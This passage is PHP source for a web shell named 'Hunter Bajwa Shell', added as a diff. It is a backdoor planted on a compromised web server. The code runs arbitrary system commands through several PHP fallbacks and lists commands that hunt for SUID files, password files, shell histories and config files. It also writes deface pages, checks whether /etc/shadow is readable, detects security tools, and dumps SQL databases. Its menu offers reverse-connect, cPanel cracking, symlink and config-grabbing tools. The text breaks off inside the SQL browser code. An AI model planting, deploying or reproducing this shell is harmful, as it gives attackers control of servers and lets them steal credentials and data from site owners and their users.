+    <body class="body">
+        <div class="font">
+            <font></font><br>
+        </div>
+        <div class="upass">
+            <form method=post>
+            <input class="input" type="password" name="pass" size="25"/>
+            </form>
+        </div>
+    </body>
+</html>');
+}
+ 
+if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
+    if( empty( $auth_pass ) ||
+        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        HunterBajwalogin();
+ 
+if( strtolower( substr(PHP_OS,0,3) ) == "win" )
+    $os = 'win';
+else
+    $os = 'nix';
+$safe_mode = @ini_get('safe_mode');
+$disable_functions = @ini_get('disable_functions');
+$home_cwd = @getcwd();
+if( isset( $_POST['c'] ) )
+    @chdir($_POST['c']);
+$cwd = @getcwd();
+if( $os == 'win') {
+    $home_cwd = str_replace("\\", "/", $home_cwd);
+    $cwd = str_replace("\\", "/", $cwd);
+}
+if( $cwd[strlen($cwd)-1] != '/' )
+    $cwd .= '/';
+   
+if($os == 'win') {
+    $aliases = array(
+        "List Directory" => "dir",
+        "Find index.php in current dir" => "dir /s /w /b index.php",
+        "Find *config*.php in current dir" => "dir /s /w /b *config*.php",
+        "Show active connections" => "netstat -an",
+        "Show running services" => "net start",
+        "User accounts" => "net user",
+        "Show computers" => "net view",
+        "ARP Table" => "arp -a",
+        "IP Configuration" => "ipconfig /all"
+    );
+} else {
+    $aliases = array(
+          "List dir" => "ls -la",
+        "list file attributes on a Linux second extended file system" => "lsattr -va",
+          "show opened ports" => "netstat -an | grep -i listen",
+        "Find" => "",
+          "find all suid files" => "find / -type f -perm -04000 -ls",
+          "find suid files in current dir" => "find . -type f -perm -04000 -ls",
+          "find all sgid files" => "find / -type f -perm -02000 -ls",
+          "find sgid files in current dir" => "find . -type f -perm -02000 -ls",
+          "find config.inc.php files" => "find / -type f -name config.inc.php",
+          "find config* files" => "find / -type f -name \"config*\"",
+          "find config* files in current dir" => "find . -type f -name \"config*\"",
+          "find all writable folders and files" => "find / -perm -2 -ls",
+          "find all writable folders and files in current dir" => "find . -perm -2 -ls",
+          "find all service.pwd files" => "find / -type f -name service.pwd",
+          "find service.pwd files in current dir" => "find . -type f -name service.pwd",
+          "find all .htpasswd files" => "find / -type f -name .htpasswd",
+          "find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
+          "find all .bash_history files" => "find / -type f -name .bash_history",
+          "find .bash_history files in current dir" => "find . -type f -name .bash_history",
+          "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
+          "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
+        "Locate" => "",
+          "locate httpd.conf files" => "locate httpd.conf",
+        "locate vhosts.conf files" => "locate vhosts.conf",
+        "locate proftpd.conf files" => "locate proftpd.conf",
+        "locate psybnc.conf files" => "locate psybnc.conf",
+        "locate my.conf files" => "locate my.conf",
+        "locate admin.php files" =>"locate admin.php",
+        "locate cfg.php files" => "locate cfg.php",
+        "locate conf.php files" => "locate conf.php",
+        "locate config.dat files" => "locate config.dat",
+        "locate config.php files" => "locate config.php",
+        "locate config.inc files" => "locate config.inc",
+        "locate config.inc.php" => "locate config.inc.php",
+        "locate config.default.php files" => "locate config.default.php",
+        "locate config* files " => "locate config",
+        "locate .conf files"=>"locate '.conf'",
+        "locate .pwd files" => "locate '.pwd'",
+        "locate .sql files" => "locate '.sql'",
+        "locate .htpasswd files" => "locate '.htpasswd'",
+        "locate .bash_history files" => "locate '.bash_history'",
+        "locate .mysql_history files" => "locate '.mysql_history'",
+        "locate .fetchmailrc files" => "locate '.fetchmailrc'",
+        "locate backup files" => "locate backup",
+        "locate dump files" => "locate dump",
+        "locate priv files" => "locate priv"    
+    );
+}
+    if(isset($_POST['p1']) && $_POST['p1']=='deface') {
+        $def = base64_decode($deface);
+        file_put_contents($_POST['c'].$_POST['p2'],$def);
+    }
+function ex($in) {
+    $out = '';
+    if(function_exists('exec')) {
+        @exec($in,$out);
+        $out = @join("\n",$out);
+    }elseif(function_exists('passthru')) {
+        ob_start();
+        @passthru($in);
+        $out = ob_get_clean();
+    }elseif(function_exists('system')) {
+        ob_start();
+        @system($in);
+        $out = ob_get_clean();
+    }elseif(function_exists('shell_exec')) {
+        $out = shell_exec($in);
+    }elseif(is_resource($f = @popen($in,"r"))) {
+        $out = "";
+        while(!@feof($f))
+            $out .= fread($f,1024);
+        pclose($f);
+    }
+    return $out;
+}
+ 
+function which($p) {
+    $path = ex('which '.$p);
+    if(!empty($path))
+        return $path;
+    return false;
+}
+   
+function printHeader() {
+    if(empty($_POST['charset']))
+        $_POST['charset'] = "UTF-8";
+    global $color;
+    global $Theme;
+    global $TabsColor;
+        echo "<html><head><link href='http://i.imgur.com/vRlLG1T.jpg' rel='Shortcut Icon' /><link href='https://fonts.googleapis.com/css?family=Josefin+Sans:400,100' rel='stylesheet' type='text/css'></head>";
+    echo '<html>
+<meta http-equiv="Content-Type" content="text/html; charset='.$_POST['charset'].'"><title>Hunter Bajwa Shell</title>
+<style>
+        body {background-color:black;color:#fff;}
+        body,td,th    { font-family: Josefin Sans, sans-serif;font-size:13px;margin:0;vertical-align:top; }
+        span,h1,a    { color:'.$color.' !important; }
+        span        { font-weight: bolder; }
+        h1            { padding: 0px 5px;font: 14pt audiowide;margin:0px 0 0 0px; }
+        div.content    { padding: 0px;margin:0 0px;background: #0F1010;border:1px solid '.$Theme.'; border-radius:5px;}
+        a            { text-decoration:none;   }
+        a:hover        { border-bottom:0px solid #5e5e5e;text-decoration:none; }
+        a:hover{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/pakistan.ani"), url("http://downloads.totallyfreecursors.com/thumbnails/PAKISTAN.gif"), auto;text-decoration:none;}
+        .ml1        { border:1px solid '.$Theme.';padding:px;margin:0;overflow: auto; }
+        .bigarea    { width:100%;height:250px;margin-top:0px; border-radius:10px; border-color:'.$Theme.'; background:#2F2F2F;}
+        input, textarea, select    { margin-top:0;color:#ABEFFF;background-color:black;border-radius:5px;border:1px solid '.$Theme.'; border-radis:5px;font: 10pt arial,"Courier New"; }
+        input[type="button"]:hover,input[type="submit"]:hover {background-color:#ABEFFF;color:black;text-decoration:none;}
+        form        { margin:0px; background:#0F1010;}
+        #toolsTbl    { text-align:center; }
+        .toolsInp    { width: 80%; background:black; border-radius:5px; border-color:'.$Theme.'; }
+        .main th    {text-align:left;background-color:'.$TabsColor.';}
+        .main tr:hover{background:#000000; border:5px solid;border-color:#000000;}
+        .main td, th{vertical-align:middle;}
+        .menu { height:30px; border-radius:10px;}
+        .menu th{padding:1px;border-radius: 5px;  background:'.$TabsColor.';     -webkit-transform: rotate(20deg);
+    -moz-transform: rotate(20deg);
+    -o-transform: rotate(20deg);
+    -ms-transform: rotate(20deg);
+    transform: rotate(20deg);}
+        .menu th:hover{background:#0F1010;text-decoration: none;}
+                pre {font-family: Josefin Sans, sans-serif;color:#FFFFFF;}
+        #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}
+ 
+               
+        .cpr {margin-bottom:5px;font-weight:bold; }
+        .cpb {width:34px;margin:0 5px;}
+       
+        .npoad td {padding:0;}
+        #Smevktools{
+        margin-top:50px;
+        width:500px;
+        border:1px solid;
+        border-radius:10px;
+    }
+    .smevklogo td{
+        font-size:12px;
+        font-weight:bold;
+       
+ 
+ 
+    }
+    .smevklogo{
+        margin-left:5px;
+        background:url();
+        background-repeat: no-repeat;
+       background-position: CENTER;
+        background-color:#0F1010;
+        background-size: 400px 120px;
+ 
+ 
+ 
+    }
+    </style>
+ 
+</html>
+<style type="text/css">body, a:hover {text-decoration:none;cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress !important;}</style><a href="http://www.cursors-4u.com/cursor/2012/02/11/chrome-pointer.html" target="_blank" title="Chrome Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Chrome Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
+    <script>
+        function set(a,c,p1,p2,p3,charset) {
+            if(a != null)document.mf.a.value=a;
+            if(c != null)document.mf.c.value=c;
+            if(p1 != null)document.mf.p1.value=p1;
+            if(p2 != null)document.mf.p2.value=p2;
+            if(p3 != null)document.mf.p3.value=p3;
+            if(charset != null)document.mf.charset.value=charset;
+        }
+        function g(a,c,p1,p2,p3,charset) {
+            set(a,c,p1,p2,p3,charset);
+            document.mf.submit();
+        }
+        function a(a,c,p1,p2,p3,charset) {
+            set(a,c,p1,p2,p3,charset);
+            var params = "ajax=true";
+            for(i=0;i<document.mf.elements.length;i++)
+                params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
+            sr("'.$_SERVER['REQUEST_URI'].'", params);
+        }
+        function sr(url, params) {    
+            if (window.XMLHttpRequest) {
+                req = new XMLHttpRequest();
+                req.onreadystatechange = processReqChange;
+                req.open("POST", url, true);
+                req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
+                req.send(params);
+            }
+            else if (window.ActiveXObject) {
+                req = new ActiveXObject("Microsoft.XMLHTTP");
+                if (req) {
+                    req.onreadystatechange = processReqChange;
+                    req.open("POST", url, true);
+                    req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
+                    req.send(params);
+                }
+            }
+        }
+        function processReqChange() {
+            if( (req.readyState == 4) )
+                if(req.status == 200) {
+                    //alert(req.responseText);
+                    var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
+                    var arr=reg.exec(req.responseText);
+                    eval(arr[2].substr(0, arr[1]));
+                }
+                else alert("Request error!");
+        }
+    </script>
+    <head><link href="https://fonts.googleapis.com/css?family=Audiowide" ></head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:5px;background:black;"><div class="content" style="border:1px solid '.$Theme.'; border-radius:5px;">
+    <form method=post name=mf style="display:none;">
+        <input type=hidden name=a value="'.(isset($_POST['a'])?$_POST['a']:'').'">
+        <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
+        <input type=hidden name=p1 value="'.(isset($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'">
+        <input type=hidden name=p2 value="'.(isset($_POST['p2'])?htmlspecialchars($_POST['p2']):'').'">
+        <input type=hidden name=p3 value="'.(isset($_POST['p3'])?htmlspecialchars($_POST['p3']):'').'">
+        <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
+    </form>';
+    $freeSpace = @diskfreespace($GLOBALS['cwd']);
+    $totalSpace = @disk_total_space($GLOBALS['cwd']);
+    $totalSpace = $totalSpace?$totalSpace:1;
+    $disable_functions = @ini_get('disable_functions');
+    $release = @php_uname('r');
+    $kernel = @php_uname('s');
+    if(!function_exists('posix_getegid')) {
+        $user = @get_current_user();
+        $uid = @getmyuid();
+        $gid = @getmygid();
+        $group = "?";
+    } else {
+        $uid = @posix_getpwuid(@posix_geteuid());
+        $gid = @posix_getgrgid(@posix_getegid());
+        $user = $uid['name'];
+        $uid = $uid['uid'];
+        $group = $gid['name'];
+        $gid = $gid['gid'];
+    }
+    $cwd_links = '';
+    $path = explode("/", $GLOBALS['cwd']);
+    $n=count($path);
+    for($i=0;$i<$n-1;$i++) {
+        $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
+        for($j=0;$j<=$i;$j++)
+            $cwd_links .= $path[$j].'/';
+        $cwd_links .= "\")'>".$path[$i]."/</a>";
+    }
+    $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
+    $opt_charsets = '';
+    foreach($charsets as $item)
+        $opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
+    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Sql'=>'Sql','Console'=>'Console','Bypasser'=>'SafeMode','Safe Mode'=>'Bypass','CgiShell'=>'CgiShell','Defacer' => 'Deface','Mini Shell'=>'cleanshell','CP Cracker'=>'cpcrack','Symlink'=>'usescript','Config'=>'configgrab','Zone-h Notifier'=>'usefulla','Backup'=>'Backupper','String tools'=>'StringTools','Shells'=>'ImportScripts','Scripts'=>'ImportTools','Back Connecter'=>'BackConnect','Readable Dirs'=>'Readable','Port Scanner'=>'PortScanner','Code Injector'=>'Injector','Dir Deface'=>'DirDefacer','Domains' => 'Domain','Self Remove' => 'SelfRemove');
+            if(!empty($GLOBALS['auth_pass']))
+                    $m['Leave'] = 'Logout';
+    $menu = '';
+    foreach($m as $k => $v)
+        $menu .= '<th><a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a></th>';
+    $drives = "";
+    if ($GLOBALS['os'] == 'win') {
+        foreach( range('a','z') as $drive ){
+            if (is_dir($drive.':\\'))
+                $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
+        }
+        $drives .= '<br />: ';
+    }
+    if($GLOBALS['os'] == 'nix') {
+        $dominios = @file_get_contents("/etc/named.conf");
+        if(!$dominios) {
+            $DomainS = "/var/named";
+            $Domainonserver = scandir($DomainS);
+            $d0c = count($Domainonserver);
+        } else {
+            @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
+            $out = sizeof(array_unique($out[1]));
+            $d0c = $out."  Domains";
+        }
+    } else {
+        $d0c = "1";
+    }
+    if($GLOBALS['os'] == 'nix' )
+    {
+        $usefl = ''; $dwnldr = '';
+        if(!@ini_get('safe_mode')) {
+            $temp = array();
+            $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
+            foreach($userful as $item) { if(which($item)) $temp[]= $item; }
+            $usefl = implode(', ',$temp);
+            $temp = array();
+            $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
+            foreach($downloaders as $item2) { if(which($item2)) $temp[]= $item2; }
+            $dwnldr = implode(', ',$temp);
+        } else {
+            $usefl = ' ------- '; $dwnldr = ' ------- ';
+        }
+    } else {
+        $usefl = ' ------- '; $dwnldr = ' ------- ';
+    }
+    echo '<div class="smevklogo"><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>
+          <td><table cellpadding="3" cellspacing="0" class="npoad"><tr><td width="80px;"><span>Uname</span></td><td>: <nobr>'.substr(@php_uname(), 0, 120).'</nobr></td></tr>
+          <tr><td><span>User</span></td><td>: '.$uid.' ( '.$user.' ) <span>Group: </span> '.$gid.' ( '.$group.' )</td></tr><tr><td><span>Server</span></td><td>: '.@getenv('SERVER_SOFTWARE').'</td></tr><tr><td><span>Useful</span></td><td>: '.$usefl.'</td></tr><tr><td><span>Downloaders</span></td><td>: '.$dwnldr.'</td></tr><tr><td><span>D/functions</span></td><td>: '.($disable_functions?$disable_functions:'All Function Enable').'</td></tr><tr><td><span>'.($GLOBALS['os'] == 'win'?'Drives<br />Cwd':'Cwd').'</span></td><td>: '.$drives.''.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a></td></tr></table></td>'.
+         '<td width=4><nobr><span>Sv IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free</span><br /><span>PHP</span><br /><span>Safe Mode</span><br /><span>Domains</span></nobr></td>'.
+         '<td><nobr>: '.gethostbyname($_SERVER["HTTP_HOST"]).'<br>: '.$_SERVER['REMOTE_ADDR'].'<br />: '.viewSize($totalSpace).'<br />: '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>: '.@phpversion().' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a><br />: '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color='.$color.'<b>OFF</b></font>').'<br />: '.$d0c.'</nobr></td></tr></table></div>'.
+         '</div></div><div style="margin:5;background:black;"><div class="content" style="border-top:5px solid 430303;padding:2px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr>'.$menu.'</tr></table></div></div><div style="margin:5;background:black;">';
+}
+function printFooter() {
+    $is_writable = is_writable($GLOBALS['cwd'])?"<font color=".$color.">[ Writeable ]</font>":"<font color=#EB4949>[ Not writable ]</font>";
+ 
+echo '</div><div style="margin:5px;background:black;"><div class="content" style="border:1px solid '.$Theme.'; border-radius:5px;">
+<table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%">
+    <tr>
+        <td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="'.htmlspecialchars($GLOBALS['cwd']).'"><input type=submit value=">>"></form></td>
+        <td><form onsubmit="g(\'FilesTools\',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
+    </tr>
+    <tr>
+        <td><form onsubmit="g(\'FilesMan\',null,\'mkdir\',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form>'.$is_writable.'</td>
+        <td><form onsubmit="g(\'FilesTools\',null,this.f.value,\'mkfile\');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form>'.$is_writable.'</td>
+    </tr>
+    <tr>
+        <td><form onsubmit="g(\'Console\',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
+        <td><form method="post" ENCTYPE="multipart/form-data">
+        <input type=hidden name=a value="FilesMAn">
+        <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
+        <input type=hidden name=p1 value="uploadFile">
+        <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
+        <span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form>'.$is_writable.'</td>
+    </tr>
+</table></div></div>
+<div style="margin:5px;background:black;"><div class="content" style="border:2px solid '.$Theme.';text-align:center;font-weight:bold; border-radius:6px;margin:auto; width:500;">Real Shell By Hunter Bajwa</a></div></div>
+</div></div>
+ 
+</body></html>';
+}
+ 
+if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
+if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }
+ 
+ 
+function viewSize($s) {
+    if($s >= 1073741824)
+        return sprintf('%1.2f', $s / 1073741824 ). ' GB';
+    elseif($s >= 1048576)
+        return sprintf('%1.2f', $s / 1048576 ) . ' MB';
+    elseif($s >= 1024)
+        return sprintf('%1.2f', $s / 1024 ) . ' KB';
+    else
+        return $s . ' B';
+}
+ 
+function perms($p) {
+    if (($p & 0xC000) == 0xC000)$i = 's';
+    elseif (($p & 0xA000) == 0xA000)$i = 'l';
+    elseif (($p & 0x8000) == 0x8000)$i = '-';
+    elseif (($p & 0x6000) == 0x6000)$i = 'b';
+    elseif (($p & 0x4000) == 0x4000)$i = 'd';
+    elseif (($p & 0x2000) == 0x2000)$i = 'c';
+    elseif (($p & 0x1000) == 0x1000)$i = 'p';
+    else $i = 'u';
+    $i .= (($p & 0x0100) ? 'r' : '-');
+    $i .= (($p & 0x0080) ? 'w' : '-');
+    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
+    $i .= (($p & 0x0020) ? 'r' : '-');
+    $i .= (($p & 0x0010) ? 'w' : '-');
+    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
+    $i .= (($p & 0x0004) ? 'r' : '-');
+    $i .= (($p & 0x0002) ? 'w' : '-');
+    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
+    return $i;
+}
+ 
+function viewPermsColor($f) {
+    if (!@is_readable($f))
+        return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
+    elseif (!@is_writable($f))
+        return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
+    else
+        return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
+}
+ 
+if(!function_exists("scandir")) {
+    function scandir($dir) {
+        $dh  = opendir($dir);
+        while (false !== ($filename = readdir($dh))) {
+            $files[] = $filename;
+        }
+        return $files;
+    }
+}
+ 
+function actionSecInfo() {
+    printHeader();
+    echo '<h1>Server security information</h1><div class=content>';
+    function showSecParam($n, $v) {
+        $v = trim($v);
+        if($v) {
+            echo '<span>'.$n.': </span>';
+            if(strpos($v, "\n") === false)
+                echo $v.'<br>';
+            else
+                echo '<pre class=ml1>'.$v.'</pre>';
+        }
+    }
+   
+    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
+    showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
+    showSecParam('Open base dir', @ini_get('open_basedir'));
+    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
+    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
+    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
+    $temp=array();
+    if(function_exists('mysql_get_client_info'))
+        $temp[] = "MySql (".mysql_get_client_info().")";
+    if(function_exists('mssql_connect'))
+        $temp[] = "MSSQL";
+    if(function_exists('pg_connect'))
+        $temp[] = "PostgreSQL";
+    if(function_exists('oci_connect'))
+        $temp[] = "Oracle";
+    showSecParam('Supported databases', implode(', ', $temp));
+    echo '<br>';
+   
+    if( $GLOBALS['os'] == 'nix' ) {
+        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
+        $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
+        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
+        showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
+        showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
+        showSecParam('OS version', @file_get_contents('/proc/version'));
+        showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
+        if(!$GLOBALS['safe_mode']) {
+            echo '<br>';
+            $temp=array();
+            foreach ($userful as $item)
+                if(which($item)){$temp[]=$item;}
+            showSecParam('Userful', implode(', ',$temp));
+            $temp=array();
+            foreach ($danger as $item)
+                if(which($item)){$temp[]=$item;}
+            showSecParam('Danger', implode(', ',$temp));
+            $temp=array();
+            foreach ($downloaders as $item)
+                if(which($item)){$temp[]=$item;}
+            showSecParam('Downloaders', implode(', ',$temp));
+            echo '<br/>';
+            showSecParam('Hosts', @file_get_contents('/etc/hosts'));
+            showSecParam('HDD space', ex('df -h'));
+            showSecParam('Mount options', @file_get_contents('/etc/fstab'));
+        }
+    } else {
+        showSecParam('OS Version',ex('ver'));
+        showSecParam('Account Settings',ex('net accounts'));
+        showSecParam('User Accounts',ex('net user'));
+    }
+    echo '</div>';
+    printFooter();
+}
+ 
+ 
+function actionSql() {
+    class DbClass {
+        var $type;
+        var $link;
+        var $res;
+        function DbClass($type)    {
+            $this->type = $type;
+        }
+        function connect($host, $user, $pass, $dbname){
+            switch($this->type)    {
+                case 'mysql':
+                    if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
+                    break;
+                case 'pgsql':
+                    $host = explode(':', $host);
+                    if(!$host[1]) $host[1]=5432;
+                    if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
+                    break;
+            }
+            return false;
+        }
+        function selectdb($db) {
+            switch($this->type)    {
+                case 'mysql':
+                    if (@mysql_select_db($db))return true;
+                    break;
+            }
+            return false;
+        }
+        function query($str) {
+            switch($this->type) {
+                case 'mysql':
+                    return $this->res = @mysql_query($str);
+                    break;
+                case 'pgsql':
+                    return $this->res = @pg_query($this->link,$str);
+                    break;
+            }
+            return false;
+        }
+        function fetch() {
+            $res = func_num_args()?func_get_arg(0):$this->res;
+            switch($this->type)    {
+                case 'mysql':
+                    return @mysql_fetch_assoc($res);
+                    break;
+                case 'pgsql':
+                    return @pg_fetch_assoc($res);
+                    break;
+            }
+            return false;
+        }
+        function listDbs() {
+            switch($this->type)    {
+                case 'mysql':
+                    return $this->res = @mysql_list_dbs($this->link);
+                break;
+                case 'pgsql':
+                    return $this->res = $this->query("SELECT datname FROM pg_database");
+                break;
+            }
+            return false;
+        }
+        function listTables() {
+            switch($this->type)    {
+                case 'mysql':
+                    return $this->res = $this->query('SHOW TABLES');
+                break;
+                case 'pgsql':
+                    return $this->res = $this->query("select table_name from information_schema.tables where (table_schema != 'information_schema' AND table_schema != 'pg_catalog') or table_name = 'pg_user'");
+                break;
+            }
+            return false;
+        }
+        function error() {
+            switch($this->type)    {
+                case 'mysql':
+                    return @mysql_error($this->link);
+                break;
+                case 'pgsql':
+                    return @pg_last_error($this->link);
+                break;
+            }
+            return false;
+        }
+        function setCharset($str) {
+            switch($this->type)    {
+                case 'mysql':
+                    if(function_exists('mysql_set_charset'))
+                        return @mysql_set_charset($str, $this->link);
+                    else
+                        $this->query('SET CHARSET '.$str);
+                    break;
+                case 'mysql':
+                    return @pg_set_client_encoding($this->link, $str);
+                    break;
+            }
+            return false;
+        }
+        function dump($table) {
+            switch($this->type)    {
+                case 'mysql':
+                    $res = $this->query('SHOW CREATE TABLE `'.$table.'`');
+                    $create = mysql_fetch_array($res);
+                    echo $create[1].";\n\n";
+                    $this->query('SELECT * FROM `'.$table.'`');
+                    while($item = $this->fetch()) {
+                        $columns = array();
+                        foreach($item as $k=>$v) {
+                            $item[$k] = "'".@mysql_real_escape_string($v)."'";
+                            $columns[] = "`".$k."`";
+                        }
+                    echo 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
+                    }
+                break;
+                case 'pgsql':
+                    $this->query('SELECT * FROM '.$table);
+                    while($item = $this->fetch()) {
+                        $columns = array();
+                        foreach($item as $k=>$v) {
+                            $item[$k] = "'".addslashes($v)."'";
+                            $columns[] = $k;
+                        }
+                    echo 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
+                    }
+                break;
+            }
+            return false;
+        }
+    };
+    $db = new DbClass(@$_POST['type']);
+    if(@$_POST['p2']=='download') {
+        ob_start("ob_gzhandler", 4096);
+        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
+        $db->selectdb($_POST['sql_base']);
+        header("Content-Disposition: attachment; filename=dump.sql");
+        header("Content-Type: text/plain");
+        foreach($_POST['tbl'] as $v)
+                $db->dump($v);
+        exit;
+    }
+    printHeader();
+    echo '<h1>Sql browser</h1><div class=content>
+    <form name="sf" method="post">
+        <table cellpadding="2" cellspacing="0">
+            <tr>
+                <td>Type</td>
+                <td>Host</td>
+                <td>Login</td>
+                <td>Password</td>
+                <td>Database</td>
+                <td></td>
+            </tr>
+            <tr>
+                <input type=hidden name=a value=Sql>
+                <input type=hidden name=p1 value=\'query\'>
+                <input type=hidden name=p2>
+                <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
+                <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
+                <td>
+                    <select name=\'type\'>
+                        <option value="mysql" '.(@$_POST['type']=='mysql'?'selected':'').'>MySql</option>
+                        <option value="pgsql" '.(@$_POST['type']=='pgsql'?'selected':'').'>PostgreSql</option>
+                    </select></td>
+                <td><input type=text name=sql_host value="'.(empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])).'"></td>
+                <td><input type=text name=sql_login value="'.(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])).'"></td>
+                <td><input type=text name=sql_pass value="'.(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])).'"></td>
+                <td>';
+    $tmp = "<input type=text name=sql_base value=''>";
+    if(isset($_POST['sql_host'])){
+        if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
+            switch($_POST['charset']) {
+                case "Windows-1251": $db->setCharset('cp1251'); break;
+                case "UTF-8": $db->setCharset('utf8'); break;
+                case "KOI8-R": $db->setCharset('koi8r'); break;
+                case "KOI8-U": $db->setCharset('koi8u'); break;
+                case "cp866": $db->setCharset('cp866'); break;
+            }
+            $db->listDbs();
+            echo "<select name=sql_base><option value=''></option>";
+            while($item = $db->fetch()) {
+                list($key, $value) = each($item);
+                echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
+            }
+            echo '</select>';
+        }
+        else echo $tmp;
+    }else
+        echo $tmp;
+    echo '</td>
+                <td><input type=submit value=">>"></td>
+            </tr>
+        </table>
+        <script>
+            function st(t,l) {
+                document.sf.p1.value = \'select\';
+                document.sf.p2.value = t;
+                if(l!=null)document.sf.p3.value = l;
+                document.sf.submit();
+            }
+            function is() {
+                for(i=0;i<document.sf.elements[\'tbl[]\'].length;++i)
+                    document.sf.elements[\'tbl[]\'][i].checked = !document.sf.elements[\'tbl[]\'][i].checked;
+            }
